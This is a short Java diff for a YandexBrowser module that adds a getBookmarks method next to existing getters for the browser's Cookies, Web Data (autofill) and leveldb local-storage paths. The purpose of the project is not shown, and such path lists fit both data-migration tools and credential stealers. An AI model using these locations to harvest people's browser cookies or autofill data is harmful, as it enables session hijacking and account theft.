@@ -13,13 +13,18 @@ public class YandexBrowser extends BrowserModule {
 	public String getCookie() {
 		return getFolder() + "/Cookies";
 	}
-	
+
 	@Override
 	public String getAutoFill() {
 		String data = OSTools.isOSLinux() ? "Web\\ Data" : "Web Data";
 		return getFolder() + "/" + data;
 	}
-	
+
+	@Override
+	public String getBookmarks() {
+		return getFolder() + "/Bookmarks";
+	}
+
 	@Override
 	public String getLevelDB() {
 		return getFolder() + "/Local Storage/leveldb";
